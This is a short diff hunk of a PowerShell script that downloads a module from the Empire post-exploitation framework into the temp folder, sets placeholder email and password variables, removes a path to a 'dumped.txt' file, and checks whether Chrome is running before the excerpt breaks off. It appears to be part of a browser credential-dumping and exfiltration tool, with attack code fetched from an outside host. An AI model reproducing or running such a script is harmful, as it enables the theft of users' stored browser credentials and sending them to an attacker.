@@ -3,7 +3,6 @@ $url = "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/modul
 $output = "$env:temp\file.psm1"
 $Username = "your email ";
 $Password = "your password";
-$path = "C:\Users\win10\AppData\Local\Temp\dumped.txt";
 (New-Object System.Net.WebClient).DownloadFile($url,$output)
 if(Get-Process -Name Chrome -ea SilentlyContinue)
 {
